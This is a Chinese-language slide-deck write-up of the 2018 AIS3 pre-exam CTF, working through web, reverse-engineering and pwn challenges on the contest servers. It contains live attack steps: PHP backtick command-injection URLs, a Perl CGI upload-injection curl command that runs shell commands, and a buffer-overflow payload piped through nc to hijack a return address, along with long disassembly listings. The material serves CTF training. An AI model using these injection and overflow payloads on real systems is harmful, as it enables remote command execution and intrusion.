---
layout: Slide
title: 2018-AIS3-PreExa
description: AIS3-PreExa-2018 Write-up
original: true
time: 2018-07-24
category: HackerSir
tags:
    - CTF
backToTop: false
---

@slidestart

# 2018-AIS3-PreExa Write-up

---

## web

---

### web-warmup

--

![](1.png)

--

![](2.png)

--

我們看到網址

`http://104.199.235.135:31331/index.php?p=7`

後面的 `index.php?p=7`

改改看他吧

--

![](3.png)

--

![](4.png)

--

我們發現改了之後 `Headers` 裡的 `Partial-Flag` 會變

所以我們找到 `p=0` 是 flag 的第一個字 `A`

`p=44` 是 flag 的最後一個字 `}`

--

所以我們寫個程式來抓吧

要自己慢慢找也是可以

--

Python 2

```python
import requests
url1="http://104.199.235.135:31331/index.php?p="
for i in range(0,100):
    url2=url1+str(i)
    re=requests.get(url2)
    print re.headers["Partial-Flag"],

p = 0
arr = []
while(True):
    r = requests.get("http://104.199.235.135:31331/index.php", params = {"p":p})
    pf = r.headers["Partial-Flag"]
    arr.append(pf)
    p += 1
    if pf == "}":
        break
print("".join(map(lambda s: " "  if s == "" else s, arr)))
```

--

這裡用 Python2 的 code

![](5.png)

---

### web-hidden

--

![](6.png)

--

![](7.png)

--

我們先看一下 `robots.txt`

--

![](8.png)

--

再看一下 `/_hidden_flag_.php`

--

![](9.png)

--

發現 `Header` 裡有 flag

但不是這個

而且等秒數倒數完後出現了下一頁的按鈕

點進去後發現 `data` 裡的 `c` 數字 +1 了

--

![](10.png)

--

所以我們寫個程式一直點下一頁

直到拿到正確的 flag

--

Python 3

```python
import requests
from bs4 import BeautifulSoup
import re

url = "http://104.199.235.135:31332/_hidden_flag_.php"
r = requests.get(url)
bs = BeautifulSoup(r.text, "html.parser")

while(True):
    try:
        if(r.headers["Flag"] == "AIS3{NOT_A_VALID_FLAG}"):
            r = requests.post(url, data={"c":c, "s":s})
            bs = BeautifulSoup(r.text, "html.parser")
            c = re.findall('name="c" value="([0-9]*)"', r.text)
            s = re.findall('name="s" value="([0-9a-z]*)"', r.text)
            print(c)
        else:
            print(r.headers)
            break
    except:
        c = re.findall('name="c" value="([0-9]*)"', r.text)
        s = re.findall('name="s" value="([0-9a-z]*)"', r.text)
        r = requests.post(url, data={"c":c[0], "s":s[0]})
        bs = BeautifulSoup(r.text, "html.parser")
```

--

Python 2

```python
import requests
from bs4 import BeautifulSoup

url = "http://104.199.235.135:31332/_hidden_flag_.php"
r = requests.get(url)
bs = BeautifulSoup(r.text, "html5lib")
while(True):
    c = bs.select("input")[0]["value"]
    s = bs.select("input")[1]["value"]
    print c
    if r.headers["Flag"] != "AIS3{NOT_A_VALID_FLAG}":
        print r.headers, r.text
        break
    r = requests.post(url, data={"c":c, "s":s})
    bs = BeautifulSoup(r.text, "html5lib")
```

--

Ruby

```ruby
require 'net/https'
require 'nokogiri'

http = Net::HTTP.new '104.199.235.135', 31332

resp = http.post2 "/_hidden_flag_.php", "", { "user-agent": "Mozilla/5.0" }

c = Nokogiri::HTML.parse(resp.body).css("input[name=c]").attr 'value'
s = Nokogiri::HTML.parse(resp.body).css("input[name=s]").attr 'value'

loop do
  resp = http.post2 "/_hidden_flag_.php", "c=#{c}&s=#{s}", { "user-agent": "Mozilla/5.0" }
  unless resp["flag"] =~ /NOT/
    puts resp["flag"]
    break
  end
  c = Nokogiri::HTML.parse(resp.body).css("input[name=c]").attr 'value'
  s = Nokogiri::HTML.parse(resp.body).css("input[name=s]").attr 'value'
  sleep 0
end
```

--

這裡用 Python3 的 code

![](11.png)

---

### web-sushi

--

![](12.png)

--

![](13.png)

--


我們可以看到 php `$_GET` 這個變數是由 URL 傳送變數給後端

所以我們要傳的指令是在 url 後面 + 上 `/?🍣=some`

此時 `$_` 這變數就存了「some」字串

--

再來我們看到他拿去過濾「\'」和「\"」

我們用 . 來避免他過濾 (php 語法) 字串相加

並且用「\`」把指令包起來

很多語言「\`\`」會直接去執行指令

例如 ``` echo `ls` ``` 會把 ls 當作指令把目錄 print出來

--

所以我們試試

```
http://104.199.235.135:31333/?%F0%9F%8D%A3=%22.`ls`.%22
```

--

我們拿到 當前目錄

<img src="14.png" width="70%" height="">

結果發現太長不能 cat

--

接下下來我們就用到一個 `*` 的技巧

`*` 代表所有

所以試試看 `cat *`

--

在網址後面補```/?🍣=".`cat *`."```

讓他把東西印出來

--

![](15.png)

---

### web-perljam

--

![](16.png)

--

![](17.png)

--

我們在網址後填入 `/.git`

看他有沒有 `.git` 的漏洞

`.git` 是如果你有用 git 在版本控制時建立的資料夾

裡面會有原檔案的資料，所以我們有機會取得原程式碼

--

![](18.png)

--

點進去 `objects`

--

![](19.png)

--

再進去 `0a`

把裡面的檔案下載下來

下載完後下 `cat 050add6a2d65064a4e3f325cc0caaad95eeed5 | zpipe -d`

嘗試解出原始檔案

--

果然我們拿到首頁原始碼

![](20.png)

--

發現他有檔案上傳的漏洞

<a href="https://tsublogs.wordpress.com/2016/09/18/606/" target="_blank" data-preview-link="false">祥情</a>

--

然後我們利用漏洞下

先瀏覽根目錄 底下其中 %20 代表空白 %2f 代表 `/` 所以是執行 `ls / |`

```
echo "asdf" | curl -F "file=ARGV" -F "file=@-" "http://104.199.235.135:31334/cgi-bin/index.cgi?ls%20%2f%20|"
```

--

<img src="21.png" width="70%" height="">

我們看到一個 readflag 的程式 執行看看吧

--

執行 `/readflag |`

```
echo "asdf" | curl -F "file=ARGV" -F "file=@-" "http://104.199.235.135:31334/cgi-bin/index.cgi?%2freadflag%20|"
```

--

![](22.png)

---

## reverse

---

### reverse-find

--

![](23.png)

--

把檔案下載下來後

輸入

`strings 你下載的檔案`

然後會跑出一堆東西

仔細找 flag 在裡面

--

![](24.png)

---

### reverse-secret

--

<img src="25.png" width="60%" height="">

---

### reverse-crackme

--

<img src="26.png" width="60%" height="">

--

<a href="https://github.com/icsharpcode/ILSpy" target="_blank" data-preview-link="false">https://github.com/icsharpcode/ILSpy</a>

下載完用這個反組譯

---

### reverse-calc

--

<img src="27.png" width="60%" height="">

--

![](28.png)

---

## pwn

---

### pwn-mail

--

<img src="29.png" width="60%" height="">

--

把他給的檔案下載下來

然後輸入 `objdump -d 你下載的檔案`

--

```
<snip>

Disassembly of section .text:

00000000004006a0 <_start>:
  4006a0:	31 ed                	xor    %ebp,%ebp
  4006a2:	49 89 d1             	mov    %rdx,%r9
  4006a5:	5e                   	pop    %rsi
  4006a6:	48 89 e2             	mov    %rsp,%rdx
  4006a9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  4006ad:	50                   	push   %rax
  4006ae:	54                   	push   %rsp
  4006af:	49 c7 c0 10 09 40 00 	mov    $0x400910,%r8
  4006b6:	48 c7 c1 a0 08 40 00 	mov    $0x4008a0,%rcx
  4006bd:	48 c7 c7 02 08 40 00 	mov    $0x400802,%rdi
  4006c4:	e8 77 ff ff ff       	callq  400640 <__libc_start_main@plt>
  4006c9:	f4                   	hlt    
  4006ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000004006d0 <deregister_tm_clones>:
  4006d0:	b8 77 10 60 00       	mov    $0x601077,%eax
  4006d5:	55                   	push   %rbp
  4006d6:	48 2d 70 10 60 00    	sub    $0x601070,%rax
  4006dc:	48 83 f8 0e          	cmp    $0xe,%rax
  4006e0:	48 89 e5             	mov    %rsp,%rbp
  4006e3:	76 1b                	jbe    400700 <deregister_tm_clones+0x30>
  4006e5:	b8 00 00 00 00       	mov    $0x0,%eax
  4006ea:	48 85 c0             	test   %rax,%rax
  4006ed:	74 11                	je     400700 <deregister_tm_clones+0x30>
  4006ef:	5d                   	pop    %rbp
  4006f0:	bf 70 10 60 00       	mov    $0x601070,%edi
  4006f5:	ff e0                	jmpq   *%rax
  4006f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4006fe:	00 00 
  400700:	5d                   	pop    %rbp
  400701:	c3                   	retq   
  400702:	0f 1f 40 00          	nopl   0x0(%rax)
  400706:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40070d:	00 00 00 

0000000000400710 <register_tm_clones>:
  400710:	be 70 10 60 00       	mov    $0x601070,%esi
  400715:	55                   	push   %rbp
  400716:	48 81 ee 70 10 60 00 	sub    $0x601070,%rsi
  40071d:	48 c1 fe 03          	sar    $0x3,%rsi
  400721:	48 89 e5             	mov    %rsp,%rbp
  400724:	48 89 f0             	mov    %rsi,%rax
  400727:	48 c1 e8 3f          	shr    $0x3f,%rax
  40072b:	48 01 c6             	add    %rax,%rsi
  40072e:	48 d1 fe             	sar    %rsi
  400731:	74 15                	je     400748 <register_tm_clones+0x38>
  400733:	b8 00 00 00 00       	mov    $0x0,%eax
  400738:	48 85 c0             	test   %rax,%rax
  40073b:	74 0b                	je     400748 <register_tm_clones+0x38>
  40073d:	5d                   	pop    %rbp
  40073e:	bf 70 10 60 00       	mov    $0x601070,%edi
  400743:	ff e0                	jmpq   *%rax
  400745:	0f 1f 00             	nopl   (%rax)
  400748:	5d                   	pop    %rbp
  400749:	c3                   	retq   
  40074a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400750 <__do_global_dtors_aux>:
  400750:	80 3d 31 09 20 00 00 	cmpb   $0x0,0x200931(%rip)        # 601088 <completed.7594>
  400757:	75 11                	jne    40076a <__do_global_dtors_aux+0x1a>
  400759:	55                   	push   %rbp
  40075a:	48 89 e5             	mov    %rsp,%rbp
  40075d:	e8 6e ff ff ff       	callq  4006d0 <deregister_tm_clones>
  400762:	5d                   	pop    %rbp
  400763:	c6 05 1e 09 20 00 01 	movb   $0x1,0x20091e(%rip)        # 601088 <completed.7594>
  40076a:	f3 c3                	repz retq 
  40076c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400770 <frame_dummy>:
  400770:	bf 20 0e 60 00       	mov    $0x600e20,%edi
  400775:	48 83 3f 00          	cmpq   $0x0,(%rdi)
  400779:	75 05                	jne    400780 <frame_dummy+0x10>
  40077b:	eb 93                	jmp    400710 <register_tm_clones>
  40077d:	0f 1f 00             	nopl   (%rax)
  400780:	b8 00 00 00 00       	mov    $0x0,%eax
  400785:	48 85 c0             	test   %rax,%rax
  400788:	74 f1                	je     40077b <frame_dummy+0xb>
  40078a:	55                   	push   %rbp
  40078b:	48 89 e5             	mov    %rsp,%rbp
  40078e:	ff d0                	callq  *%rax
  400790:	5d                   	pop    %rbp
  400791:	e9 7a ff ff ff       	jmpq   400710 <register_tm_clones>

0000000000400796 <reply>:
  400796:	55                   	push   %rbp
  400797:	48 89 e5             	mov    %rsp,%rbp
  40079a:	48 83 ec 10          	sub    $0x10,%rsp
  40079e:	bf 28 09 40 00       	mov    $0x400928,%edi
  4007a3:	e8 68 fe ff ff       	callq  400610 <puts@plt>
  4007a8:	bf 5b 09 40 00       	mov    $0x40095b,%edi
  4007ad:	b8 00 00 00 00       	mov    $0x0,%eax
  4007b2:	e8 79 fe ff ff       	callq  400630 <printf@plt>
  4007b7:	be 70 09 40 00       	mov    $0x400970,%esi
  4007bc:	bf 72 09 40 00       	mov    $0x400972,%edi
  4007c1:	e8 ba fe ff ff       	callq  400680 <fopen@plt>
  4007c6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4007ca:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
  4007cf:	74 2e                	je     4007ff <reply+0x69>
  4007d1:	eb 0b                	jmp    4007de <reply+0x48>
  4007d3:	0f be 45 f7          	movsbl -0x9(%rbp),%eax
  4007d7:	89 c7                	mov    %eax,%edi
  4007d9:	e8 22 fe ff ff       	callq  400600 <putchar@plt>
  4007de:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4007e2:	48 89 c7             	mov    %rax,%rdi
  4007e5:	e8 76 fe ff ff       	callq  400660 <_IO_getc@plt>
  4007ea:	88 45 f7             	mov    %al,-0x9(%rbp)
  4007ed:	80 7d f7 ff          	cmpb   $0xff,-0x9(%rbp)
  4007f1:	75 e0                	jne    4007d3 <reply+0x3d>
  4007f3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4007f7:	48 89 c7             	mov    %rax,%rdi
  4007fa:	e8 21 fe ff ff       	callq  400620 <fclose@plt>
  4007ff:	90                   	nop
  400800:	c9                   	leaveq 
  400801:	c3                   	retq   

0000000000400802 <main>:
  400802:	55                   	push   %rbp
  400803:	48 89 e5             	mov    %rsp,%rbp
  400806:	48 81 ec 40 03 00 00 	sub    $0x340,%rsp
  40080d:	48 8b 05 5c 08 20 00 	mov    0x20085c(%rip),%rax        # 601070 <__TMC_END__>
  400814:	b9 00 00 00 00       	mov    $0x0,%ecx
  400819:	ba 02 00 00 00       	mov    $0x2,%edx
  40081e:	be 00 00 00 00       	mov    $0x0,%esi
  400823:	48 89 c7             	mov    %rax,%rdi
  400826:	e8 45 fe ff ff       	callq  400670 <setvbuf@plt>
  40082b:	48 8b 05 4e 08 20 00 	mov    0x20084e(%rip),%rax        # 601080 <stdin@@GLIBC_2.2.5>
  400832:	b9 00 00 00 00       	mov    $0x0,%ecx
  400837:	ba 02 00 00 00       	mov    $0x2,%edx
  40083c:	be 00 00 00 00       	mov    $0x0,%esi
  400841:	48 89 c7             	mov    %rax,%rdi
  400844:	e8 27 fe ff ff       	callq  400670 <setvbuf@plt>
  400849:	bf 7b 09 40 00       	mov    $0x40097b,%edi
  40084e:	b8 00 00 00 00       	mov    $0x0,%eax
  400853:	e8 d8 fd ff ff       	callq  400630 <printf@plt>
  400858:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  40085c:	48 89 c7             	mov    %rax,%rdi
  40085f:	b8 00 00 00 00       	mov    $0x0,%eax
  400864:	e8 e7 fd ff ff       	callq  400650 <gets@plt>
  400869:	bf 86 09 40 00       	mov    $0x400986,%edi
  40086e:	b8 00 00 00 00       	mov    $0x0,%eax
  400873:	e8 b8 fd ff ff       	callq  400630 <printf@plt>
  400878:	48 8d 85 c0 fc ff ff 	lea    -0x340(%rbp),%rax
  40087f:	48 89 c7             	mov    %rax,%rdi
  400882:	b8 00 00 00 00       	mov    $0x0,%eax
  400887:	e8 c4 fd ff ff       	callq  400650 <gets@plt>
  40088c:	b8 00 00 00 00       	mov    $0x0,%eax
  400891:	c9                   	leaveq 
  400892:	c3                   	retq   
  400893:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40089a:	00 00 00 
  40089d:	0f 1f 00             	nopl   (%rax)

<snip>
```

--

先大致上看一下有 `<>` 的地方

這是函數的名稱

會發現 `<reply>` 似乎沒有用到

所以我們的目標是進到 `<reply>`

再看一下 `<reply>` 的記憶體位置

往上找到 `400796`

這就是它的位置

--

在找到 `<main>`

這個是 main 函式

然後再找 `<gets@plt>`

這是接受你輸入的函式

在往上找看他輸入後是丟給誰

--

找到 `%rbp` 他前面的 `0x20` 代表 32 位元的長度

`%rbp` 是一個暫存器代表目前 stack frame 的底

而回傳位址存在他找的位址的下面

所以把它塞爆之後就可以到你想去的地方了

--

所以我們要塞給他

```
"任意字"*40 + "\x96\x07\x40\x00\x00\x00\x00\x00"
```

因為位置在 `400796`

但是他讀的方式是倒著的

--

所以輸入

```shell
python -c 'print("a"*40 + "\x96\x07\x40\x00\x00\x00\x00\x00")' | nc 104.199.235.135 2111
```

--

![](30.png)

---

### pwn-darling

--

<img src="31.png" width="60%" height="">

--

把兩個檔案都下載下來之後

我們先看 `.c檔`

--

我們看到兩行輸入

```c
scanf("%d", &idx); //可得知第一個輸入會放在idx
scanf("%lld", &pair[idx]);//第二個輸入放入pair[idx]
```

然後有一行 if 在檢查 idx

```c
if (idx > 2)
```

但是他並沒有檢查下限

所以我們可以用這個讓程式跳到我們要的地方

--

在看到有一個函式完全沒用到

```c
void debug() {
  system("/bin/sh"); // 此為 shell 的呼叫
}
```

所以我們的目標就是要跳到這

--

接下來我們下指令

`objdump -d 下載的檔案`

來查看記憶體位置

--

```
Disassembly of section .init:

0000000000400610 <_init>:
  400610:	48 83 ec 08          	sub    $0x8,%rsp
  400614:	48 8b 05 dd 19 20 00 	mov    0x2019dd(%rip),%rax        # 601ff8 <_DYNAMIC+0x1d0>
  40061b:	48 85 c0             	test   %rax,%rax
  40061e:	74 05                	je     400625 <_init+0x15>
  400620:	e8 ab 00 00 00       	callq  4006d0 <exit@plt+0x10>
  400625:	48 83 c4 08          	add    $0x8,%rsp
  400629:	c3                   	retq   

Disassembly of section .plt:

0000000000400630 <puts@plt-0x10>:
  400630:	ff 35 d2 19 20 00    	pushq  0x2019d2(%rip)        # 602008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400636:	ff 25 d4 19 20 00    	jmpq   *0x2019d4(%rip)        # 602010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40063c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400640 <puts@plt>:
  400640:	ff 25 d2 19 20 00    	jmpq   *0x2019d2(%rip)        # 602018 <_GLOBAL_OFFSET_TABLE_+0x18>
  400646:	68 00 00 00 00       	pushq  $0x0
  40064b:	e9 e0 ff ff ff       	jmpq   400630 <_init+0x20>

0000000000400650 <__stack_chk_fail@plt>:
  400650:	ff 25 ca 19 20 00    	jmpq   *0x2019ca(%rip)        # 602020 <_GLOBAL_OFFSET_TABLE_+0x20>
  400656:	68 01 00 00 00       	pushq  $0x1
  40065b:	e9 d0 ff ff ff       	jmpq   400630 <_init+0x20>

0000000000400660 <system@plt>:
  400660:	ff 25 c2 19 20 00    	jmpq   *0x2019c2(%rip)        # 602028 <_GLOBAL_OFFSET_TABLE_+0x28>
  400666:	68 02 00 00 00       	pushq  $0x2
  40066b:	e9 c0 ff ff ff       	jmpq   400630 <_init+0x20>

0000000000400670 <printf@plt>:
  400670:	ff 25 ba 19 20 00    	jmpq   *0x2019ba(%rip)        # 602030 <_GLOBAL_OFFSET_TABLE_+0x30>
  400676:	68 03 00 00 00       	pushq  $0x3
  40067b:	e9 b0 ff ff ff       	jmpq   400630 <_init+0x20>

0000000000400680 <read@plt>:
  400680:	ff 25 b2 19 20 00    	jmpq   *0x2019b2(%rip)        # 602038 <_GLOBAL_OFFSET_TABLE_+0x38>
  400686:	68 04 00 00 00       	pushq  $0x4
  40068b:	e9 a0 ff ff ff       	jmpq   400630 <_init+0x20>

0000000000400690 <__libc_start_main@plt>:
  400690:	ff 25 aa 19 20 00    	jmpq   *0x2019aa(%rip)        # 602040 <_GLOBAL_OFFSET_TABLE_+0x40>
  400696:	68 05 00 00 00       	pushq  $0x5
  40069b:	e9 90 ff ff ff       	jmpq   400630 <_init+0x20>

00000000004006a0 <setvbuf@plt>:
  4006a0:	ff 25 a2 19 20 00    	jmpq   *0x2019a2(%rip)        # 602048 <_GLOBAL_OFFSET_TABLE_+0x48>
  4006a6:	68 06 00 00 00       	pushq  $0x6
  4006ab:	e9 80 ff ff ff       	jmpq   400630 <_init+0x20>

00000000004006b0 <__isoc99_scanf@plt>:
  4006b0:	ff 25 9a 19 20 00    	jmpq   *0x20199a(%rip)        # 602050 <_GLOBAL_OFFSET_TABLE_+0x50>
  4006b6:	68 07 00 00 00       	pushq  $0x7
  4006bb:	e9 70 ff ff ff       	jmpq   400630 <_init+0x20>

00000000004006c0 <exit@plt>:
  4006c0:	ff 25 92 19 20 00    	jmpq   *0x201992(%rip)        # 602058 <_GLOBAL_OFFSET_TABLE_+0x58>
  4006c6:	68 08 00 00 00       	pushq  $0x8
  4006cb:	e9 60 ff ff ff       	jmpq   400630 <_init+0x20>

Disassembly of section .plt.got:

00000000004006d0 <.plt.got>:
  4006d0:	ff 25 22 19 20 00    	jmpq   *0x201922(%rip)        # 601ff8 <_DYNAMIC+0x1d0>
  4006d6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000004006e0 <_start>:
  4006e0:	31 ed                	xor    %ebp,%ebp
  4006e2:	49 89 d1             	mov    %rdx,%r9
  4006e5:	5e                   	pop    %rsi
  4006e6:	48 89 e2             	mov    %rsp,%rdx
  4006e9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  4006ed:	50                   	push   %rax
  4006ee:	54                   	push   %rsp
  4006ef:	49 c7 c0 70 0d 40 00 	mov    $0x400d70,%r8
  4006f6:	48 c7 c1 00 0d 40 00 	mov    $0x400d00,%rcx
  4006fd:	48 c7 c7 e7 07 40 00 	mov    $0x4007e7,%rdi
  400704:	e8 87 ff ff ff       	callq  400690 <__libc_start_main@plt>
  400709:	f4                   	hlt    
  40070a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400710 <deregister_tm_clones>:
  400710:	b8 77 20 60 00       	mov    $0x602077,%eax
  400715:	55                   	push   %rbp
  400716:	48 2d 70 20 60 00    	sub    $0x602070,%rax
  40071c:	48 83 f8 0e          	cmp    $0xe,%rax
  400720:	48 89 e5             	mov    %rsp,%rbp
  400723:	76 1b                	jbe    400740 <deregister_tm_clones+0x30>
  400725:	b8 00 00 00 00       	mov    $0x0,%eax
  40072a:	48 85 c0             	test   %rax,%rax
  40072d:	74 11                	je     400740 <deregister_tm_clones+0x30>
  40072f:	5d                   	pop    %rbp
  400730:	bf 70 20 60 00       	mov    $0x602070,%edi
  400735:	ff e0                	jmpq   *%rax
  400737:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40073e:	00 00 
  400740:	5d                   	pop    %rbp
  400741:	c3                   	retq   
  400742:	0f 1f 40 00          	nopl   0x0(%rax)
  400746:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40074d:	00 00 00 

0000000000400750 <register_tm_clones>:
  400750:	be 70 20 60 00       	mov    $0x602070,%esi
  400755:	55                   	push   %rbp
  400756:	48 81 ee 70 20 60 00 	sub    $0x602070,%rsi
  40075d:	48 c1 fe 03          	sar    $0x3,%rsi
  400761:	48 89 e5             	mov    %rsp,%rbp
  400764:	48 89 f0             	mov    %rsi,%rax
  400767:	48 c1 e8 3f          	shr    $0x3f,%rax
  40076b:	48 01 c6             	add    %rax,%rsi
  40076e:	48 d1 fe             	sar    %rsi
  400771:	74 15                	je     400788 <register_tm_clones+0x38>
  400773:	b8 00 00 00 00       	mov    $0x0,%eax
  400778:	48 85 c0             	test   %rax,%rax
  40077b:	74 0b                	je     400788 <register_tm_clones+0x38>
  40077d:	5d                   	pop    %rbp
  40077e:	bf 70 20 60 00       	mov    $0x602070,%edi
  400783:	ff e0                	jmpq   *%rax
  400785:	0f 1f 00             	nopl   (%rax)
  400788:	5d                   	pop    %rbp
  400789:	c3                   	retq   
  40078a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400790 <__do_global_dtors_aux>:
  400790:	80 3d f1 18 20 00 00 	cmpb   $0x0,0x2018f1(%rip)        # 602088 <completed.7594>
  400797:	75 11                	jne    4007aa <__do_global_dtors_aux+0x1a>
  400799:	55                   	push   %rbp
  40079a:	48 89 e5             	mov    %rsp,%rbp
  40079d:	e8 6e ff ff ff       	callq  400710 <deregister_tm_clones>
  4007a2:	5d                   	pop    %rbp
  4007a3:	c6 05 de 18 20 00 01 	movb   $0x1,0x2018de(%rip)        # 602088 <completed.7594>
  4007aa:	f3 c3                	repz retq 
  4007ac:	0f 1f 40 00          	nopl   0x0(%rax)

00000000004007b0 <frame_dummy>:
  4007b0:	bf 20 1e 60 00       	mov    $0x601e20,%edi
  4007b5:	48 83 3f 00          	cmpq   $0x0,(%rdi)
  4007b9:	75 05                	jne    4007c0 <frame_dummy+0x10>
  4007bb:	eb 93                	jmp    400750 <register_tm_clones>
  4007bd:	0f 1f 00             	nopl   (%rax)
  4007c0:	b8 00 00 00 00       	mov    $0x0,%eax
  4007c5:	48 85 c0             	test   %rax,%rax
  4007c8:	74 f1                	je     4007bb <frame_dummy+0xb>
  4007ca:	55                   	push   %rbp
  4007cb:	48 89 e5             	mov    %rsp,%rbp
  4007ce:	ff d0                	callq  *%rax
  4007d0:	5d                   	pop    %rbp
  4007d1:	e9 7a ff ff ff       	jmpq   400750 <register_tm_clones>

00000000004007d6 <debug>:
  4007d6:	55                   	push   %rbp
  4007d7:	48 89 e5             	mov    %rsp,%rbp
  4007da:	bf 88 0d 40 00       	mov    $0x400d88,%edi
  4007df:	e8 7c fe ff ff       	callq  400660 <system@plt>
  4007e4:	90                   	nop
  4007e5:	5d                   	pop    %rbp
  4007e6:	c3                   	retq   

00000000004007e7 <main>:
  4007e7:	55                   	push   %rbp
  4007e8:	48 89 e5             	mov    %rsp,%rbp
  4007eb:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
  4007f2:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4007f9:	00 00 
  4007fb:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4007ff:	31 c0                	xor    %eax,%eax
  400801:	48 8b 05 68 18 20 00 	mov    0x201868(%rip),%rax        # 602070 <__TMC_END__>
  400808:	b9 00 00 00 00       	mov    $0x0,%ecx
  40080d:	ba 02 00 00 00       	mov    $0x2,%edx
  400812:	be 00 00 00 00       	mov    $0x0,%esi
  400817:	48 89 c7             	mov    %rax,%rdi
  40081a:	e8 81 fe ff ff       	callq  4006a0 <setvbuf@plt>
  40081f:	48 8b 05 5a 18 20 00 	mov    0x20185a(%rip),%rax        # 602080 <stdin@@GLIBC_2.2.5>
  400826:	b9 00 00 00 00       	mov    $0x0,%ecx
  40082b:	ba 02 00 00 00       	mov    $0x2,%edx
  400830:	be 00 00 00 00       	mov    $0x0,%esi
  400835:	48 89 c7             	mov    %rax,%rdi
  400838:	e8 63 fe ff ff       	callq  4006a0 <setvbuf@plt>
  40083d:	48 c7 85 70 ff ff ff 	movq   $0x6f726948,-0x90(%rbp)
  400844:	48 69 72 6f 
  400848:	48 c7 85 78 ff ff ff 	movq   $0x0,-0x88(%rbp)
  40084f:	00 00 00 00 
  400853:	48 b8 5a 65 72 6f 20 	movabs $0x6f7754206f72655a,%rax
  40085a:	54 77 6f 
  40085d:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  400861:	48 c7 45 88 00 00 00 	movq   $0x0,-0x78(%rbp)
  400868:	00 
  400869:	48 b8 49 63 68 69 67 	movabs $0x6f6769686349,%rax
  400870:	6f 00 00 
  400873:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  400877:	48 c7 45 98 00 00 00 	movq   $0x0,-0x68(%rbp)
  40087e:	00 
  40087f:	48 c7 45 a0 47 6f 72 	movq   $0x6f726f47,-0x60(%rbp)
  400886:	6f 
  400887:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
  40088e:	00 
  40088f:	48 c7 45 b0 4d 69 6b 	movq   $0x756b694d,-0x50(%rbp)
  400896:	75 
  400897:	48 c7 45 b8 00 00 00 	movq   $0x0,-0x48(%rbp)
  40089e:	00 
  40089f:	48 b8 5a 6f 72 6f 6d 	movabs $0x656d6f726f5a,%rax
  4008a6:	65 00 00 
  4008a9:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4008ad:	48 c7 45 c8 00 00 00 	movq   $0x0,-0x38(%rbp)
  4008b4:	00 
  4008b5:	48 b8 4b 6f 6b 6f 72 	movabs $0x6f726f6b6f4b,%rax
  4008bc:	6f 00 00 
  4008bf:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  4008c3:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
  4008ca:	00 
  4008cb:	48 b8 46 75 74 6f 73 	movabs $0x6968736f747546,%rax
  4008d2:	68 69 00 
  4008d5:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  4008d9:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
  4008e0:	00 
  4008e1:	48 c7 85 e0 fe ff ff 	movq   $0x10,-0x120(%rbp)
  4008e8:	10 00 00 00 
  4008ec:	48 c7 85 e8 fe ff ff 	movq   $0x2,-0x118(%rbp)
  4008f3:	02 00 00 00 
  4008f7:	48 c7 85 f0 fe ff ff 	movq   $0xf,-0x110(%rbp)
  4008fe:	0f 00 00 00 
  400902:	48 c7 85 f8 fe ff ff 	movq   $0x38,-0x108(%rbp)
  400909:	38 00 00 00 
  40090d:	48 c7 85 00 ff ff ff 	movq   $0x186,-0x100(%rbp)
  400914:	86 01 00 00 
  400918:	48 c7 85 08 ff ff ff 	movq   $0x29a,-0xf8(%rbp)
  40091f:	9a 02 00 00 
  400923:	48 c7 85 10 ff ff ff 	movq   $0x22c,-0xf0(%rbp)
  40092a:	2c 02 00 00 
  40092e:	48 c7 85 18 ff ff ff 	movq   $0xd6,-0xe8(%rbp)
  400935:	d6 00 00 00 
  400939:	48 c7 85 d0 fe ff ff 	movq   $0x0,-0x130(%rbp)
  400940:	00 00 00 00 
  400944:	48 c7 85 d8 fe ff ff 	movq   $0x0,-0x128(%rbp)
  40094b:	00 00 00 00 
  40094f:	48 c7 85 c8 fe ff ff 	movq   $0x642,-0x138(%rbp)
  400956:	42 06 00 00 
  40095a:	48 b8 53 74 72 65 6c 	movabs $0x7a74696c65727453,%rax
  400961:	69 74 7a 
  400964:	48 89 85 20 ff ff ff 	mov    %rax,-0xe0(%rbp)
  40096b:	48 c7 85 28 ff ff ff 	movq   $0x6169,-0xd8(%rbp)
  400972:	69 61 00 00 
  400976:	48 b8 44 65 6c 70 68 	movabs $0x696e6968706c6544,%rax
  40097d:	69 6e 69 
  400980:	48 89 85 30 ff ff ff 	mov    %rax,-0xd0(%rbp)
  400987:	48 c7 85 38 ff ff ff 	movq   $0x6d75,-0xc8(%rbp)
  40098e:	75 6d 00 00 
  400992:	48 b8 41 72 67 65 6e 	movabs $0x6165746e65677241,%rax
  400999:	74 65 61 
  40099c:	48 89 85 40 ff ff ff 	mov    %rax,-0xc0(%rbp)
